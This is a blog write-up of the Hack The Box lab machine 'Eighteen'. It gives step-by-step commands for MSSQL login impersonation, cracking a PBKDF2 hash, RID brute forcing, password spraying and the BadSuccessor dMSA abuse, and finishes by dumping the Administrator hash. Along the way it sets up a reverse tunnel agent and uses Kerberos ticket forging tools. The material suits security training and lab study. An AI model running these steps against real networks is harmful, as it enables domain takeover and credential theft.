---
date: 2026-04-11T02:30:27-05:00
# description: ""
image: "/images/HTB-Eighteen/Eigtheen.png"
showTableOfContents: true
tags: ["HackTheBox", "Labs", "Active Directory", "MSSQL", "PBKDF2", "Password Spraying", "RID Brute Force", "BadSuccessor", "CVE-2025-53779", "dMSA", "Delegation Abuse", "Kerberos Delegation"]
categories: ["Red Teaming"]
title: "HTB: Eighteen"
type: "post"
---

* Platform: Hack The Box
* Link: [Eighteen](https://app.hackthebox.com/machines/Eighteen)
* Level: Easy
* OS: Windows
---

Eighteen starts with the discovery of MSSQL impersonation privileges, allowing access to the `appdev` account and extraction of a PBKDF2-SHA256 hash, which is cracked to recover a password. RID brute forcing and password spraying lead to a valid user login via WinRM. 

System enumeration identifies Windows Server 2025 and the BadSuccessor vulnerability. By abusing OU permissions, a malicious dMSA account is created and leveraged for Kerberos delegation, ultimately allowing impersonation of Administrator and full domain compromise.

# Scanning

```
nmap -p- --open -T4 -sCV -oA nmap/Eighteen {TARGET_IP}
```

**Results**
```shell
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-11 11:37 EDT
Nmap scan report for 10.129.26.3 (10.129.26.3)
Host is up (0.19s latency).
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://eighteen.htb/

1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.26.3:1433: 
|     Target_Name: EIGHTEEN
|     NetBIOS_Domain_Name: EIGHTEEN
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: eighteen.htb
|     DNS_Computer_Name: DC01.eighteen.htb
|     DNS_Tree_Name: eighteen.htb
|_    Product_Version: 10.0.26100
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-04-11T14:36:10
|_Not valid after:  2056-04-11T14:36:10
|_ssl-date: 2026-04-11T14:43:29+00:00; -1h00m01s from scanner time.
| ms-sql-info: 
|   10.129.26.3:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433

5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1h00m01s, deviation: 0s, median: -1h00m02s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 367.77 seconds
```

Three open ports:
- 80 is running http with `Microsoft IIS httpd 10.0`, we also have a redirection to `eighteen.htb`
- 1433 is running `Microsoft SQL Server 2022`
- 5985 is the default port for `WinRM` (Remote Management)

```
echo "{IP} eighteen.htb DC01.eighteen.htb" | sudo tee -a /etc/hosts
```


# Enumeration

At `http://eighteen.htb/` we find a financial web application.

![Eighteen website](/images/HTB-Eighteen/eighteen_website.png)

After registering and logging in we have access to a dashboard.

![Eighteen dashboard](/images/HTB-Eighteen/eighteen_dashboard.png)

There is also an `Admin` page but we cannot access it.

![Access denied](/images/HTB-Eighteen/access_denied.png)

## MSSQL Enumeration

Directory brute forcing and subdomain enumeration are both unfruitful so we turn our attention to MSSQL.

Using the provided credentials we log into the database.

```
impacket-mssqlclient 'kevin:iNa2we6haRj2gaw!'@eighteen.htb
```

![mssql login](/images/HTB-Eighteen/eighteen_mssql.png)

We start by enumerating the databases.

```
enum_db
```

![database enumeration](/images/HTB-Eighteen/eighteen_enum-db.png)

The target has one custom database `financial_planner`. We try to access it but our user is unable to.

```
USE financial_planner;
```

`ERROR(DC01): Line 1: The server principal "kevin" is not able to access the database "financial_planner" under the current security context.`

![db access denied](/images/HTB-Eighteen/db_access_denied.png)

So we continue the enumeration with:
```
enum_impersonate
```

![db enum impersonate](/images/HTB-Eighteen/enum_impersonate.png)

The user `kevin` has been granted the ability to impersonate the login `appdev`. We switch the context with:

```
EXECUTE AS LOGIN = 'appdev';
```

We are now able to access the database.

![MSSQL as appdev](/images/HTB-Eighteen/appdev_mssql.png)

We list all tables:
```
SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;
```

![tables listed](/images/HTB-Eighteen/eighteen_list_tables.png)

The `users` table seems the most interesting.

```
SELECT * FROM users;
```

![admin hash](/images/HTB-Eighteen/admin_hash.png)

## PBKDF2 hash 

We recover a PBKDF2-SHA256 hash.

```
pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133
```

This hash format was thrown at us in [HTB: Compiled](https://scorpiosec.com/posts/htb-compiled/). This time we have to do some formatting because hashcat expects the following format: 
```
<HASH_ALGORITHM>:<NUMBER_OF_ITERATIONS>:<base64_SALT>:<base64_hash>
```

The salt value: `AMtzteQIG7yAbZIa`

The hash value: `0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133`

- Convert the salt to base64
```
QU10enRlUUlHN3lBYlpJYQ==
```

- Convert the hash value to bytes (we need the length of the derived key in bytes) and then to base64.
```
BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=
```

The lenght is `32`.

We use the following script to quickly do it.
```python
import base64

h = "0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133"
raw = bytes.fromhex(h)
b64 = base64.b64encode(raw).decode()

print(raw)
print(b64)
print(len(raw))
```

![hash data](/images/HTB-Eighteen/hash_data.png)

So the complete hash is:
```
sha256:600000:QU10enRlUUlHN3lBYlpJYQ==:BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=
```


We crack it with hashcat and recover the password `iloveyou1`.
```
hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt -O
```

![password recovered](/images/HTB-Eighteen/pbkdf2_hash_cracked.png)

We login as `admin` in the web application, access to the Admin Dashboard is now possible.

![admin dashboard accessed](/images/HTB-Eighteen/admin_dashboard.png)

Even with the admin access there seem to be no exploitation path in the web application.

At the bottom of the page we learn that this is a Flask application, with a database server named `dc01`.

![system info](/images/HTB-Eighteen/system_info.png)

When running `enum_links` in MSSQL we can indeed see it.

![MSSQL enum_links](/images/HTB-Eighteen/eighteen_enum_links.png)

# Initial Foothold

## RID Brute Forcing
One thing we can do is attempt to find some user names via RID brute forcing.

```
netexec mssql eighteen.htb -u kevin -p 'iNa2we6haRj2gaw!' --rid-brute --local-auth
```

![RID brute force](/images/HTB-Eighteen/eghteen_RDI_bruteforce.png)

## Password Spray
We do a password spray for `WinRM` and find a match!

```
netexec winrm eighteen.htb -u usernames.txt -p 'iloveyou1' --no-bruteforce
```

![password spray](/images/HTB-Eighteen/winrm_pwd_spray.png)

We login with:
```
evil-winrm -i eighteen.htb -u adam.scott -p 'iloveyou1'
```

![user flag](/images/HTB-Eighteen/eighteen_user.png)

# Privilege Escalation

Besides `Administrator` the other account is `mssqlsvc`.

> Service accounts such as `mssqlsvc` do not log interactively nor do they usually have profiles in `C:\Users`.

![user accounts](/images/HTB-Eighteen/eighteen_users.png)

From the previous netexec command (RID brute forcing) we know that we are dealing with Windows Server 2025. Bloodhound does not reveal any exploitable paths so we look for vulnerabilities of this version.

When looking up `Windows Server 2025 vulnerability` on Goggle, we find [BadSuccessor](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory), a privilege escalation vulnerability. The article shows how to abuse the dMSA feature in order to escalate privileges.

The exploitation works in two scenarios:
- Delegation already exists --> we exploit it directly.
- Delegation does not exist but we create it --> we need write permissions on OU in that case.

## OU Enumeration
Using the powershell script below we enumerate all OUs, inspect their ACLs, and filters for interesting Active Directory permissions.

```powershell
Import-Module .\PowerView.ps1

# Get current user object
$currentUser = Get-DomainUser -Identity (whoami)

# Enumerate ACLs on all OUs
Get-DomainOU | ForEach-Object {
    $currentOU = $_

    Get-DomainObjectAcl -Identity $currentOU.DistinguishedName -ResolveGUIDs |
        Where-Object {
            $_.IdentityReference -eq $currentUser.SID -and
            ($_.ActiveDirectoryRights -match 'CreateChild|GenericAll|GenericWrite')
        } |
        Select-Object @{
            Name = 'OU'
            Expression = { $currentOU.Name }
        }, IdentityReference, ActiveDirectoryRights
}
```

![OUs enumeration](/images/HTB-Eighteen/OUs_enumeration.png)

`adam.scott` has `GenericalAll`, `CreateChild`, `WriteDacl`, `WriteOwner` and more AD permissions on the `Staff` and `Domain Controllers` OUs.


## dMSA Abuse
We can create a dMSA object as well as completely control it.

**1. Module import (get it from [here](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)).**

```
Import-Module .\BadSuccessor.ps1
```

**2. Malicious dMSA creation to impersonate `Administrator`.**
```
BadSuccessor -mode exploit -Path "OU=Staff,DC=eighteen,DC=htb" -Name "evil_dMSA" -DelegatedAdmin "adam.scott" -DelegateTarget "Administrator" -domain "eighteen.htb"
```

![malicious dMSA creation](/images/HTB-Eighteen/bad_dmsa.png)

**3. Tunnel setup**

In order to reach the domain controller from our attack machine we use ligolo to setup a tunnel.

**On attack machine**

```
ligolo-proxy -selfcert -laddr 0.0.0.0:11601
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 240.0.0.1/32 dev ligolo
```

**On target machine**
```
# Use the upload feature in evil-winrm
upload agent.exe
.\agent.exe -connect <KALI_IP>:11601 -ignore-cert
```

**In LIGOLO**
```
session
1
start
```

![ligolo setup](/images/HTB-Eighteen/eighteen_ligolo_setup.png)

**4. Time synchronization**
```
faketime "$(curl -sik http://eighteen.htb:5985/ | grep -i 'Date: ' | sed s/'Date: '//g)" bash
```

**5. `adam.scott` Kerberos TGT request**
```
impacket-getTGT eighteen.htb/'adam.scott:iloveyou1' -dc-ip 240.0.0.1
```

![adam scott ticket](/images/HTB-Eighteen/adam_scott_ticket.png)


```
export KRB5CCNAME=adam.scott.ccache
```

**6. Kerberos service ticket request via S4U2Self to impersonate `evil_DMSA$`**
```
python3 getST.py eighteen.htb/adam.scott:iloveyou1 -impersonate 'evil_DMSA$' -dc-ip 240.0.0.1 -dmsa -self -k -no-pass
```
![dMSA ticket request](/images/HTB-Eighteen/dMSA_ticket_request.png)

```
export KRB5CCNAME="evil_DMSA\$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache"
```
![dMSA ticket export ](/images/HTB-Eighteen/ticket_export2.png)

**7. Administrator hash dump**
```
impacket-secretsdump EIGHTEEN.HTB/evil_dMSA\$@dc01.eighteen.htb -k -no-pass -dc-ip 240.0.0.1 -target-ip 240.0.0.1 -just-dc-user Administrator
```
![eight secrets dump](/images/HTB-Eighteen/eight_secretsdump.png)

**8. Login as Administrator**
```
evil-winrm -i dc01.eighteen.htb -u administrator -H {hash}
```
![eighteen root flag](/images/HTB-Eighteen/eighteen_root.png)






